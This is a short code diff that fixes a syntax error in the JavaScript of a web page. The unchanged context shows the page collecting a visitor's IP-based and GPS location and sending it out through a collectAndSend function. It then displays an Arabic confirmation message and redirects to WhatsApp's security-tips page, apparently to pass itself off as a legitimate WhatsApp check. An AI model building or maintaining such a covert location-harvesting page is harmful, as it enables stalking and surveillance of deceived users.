@@ -241,7 +241,7 @@
                             method: 'ip_geolocation', ip_data: data 
                         });
                         locateBtn.disabled = true;
-                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
+                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'; }, 3000);
                         return true;
                     }
                 } catch(e) {}
@@ -265,7 +265,7 @@
                         showStatus(`✅ تم التأكيد! الدقة: ${Math.round(acc)}م`, 'success');
                         initMap(lat, lng, acc);
                         await collectAndSend({ latitude: lat, longitude: lng, accuracy: acc, method: 'gps' });
-                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
+                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'; }, 3000);
                     },
                     async (err) => {
                         console.warn('GPS error:', err.code);
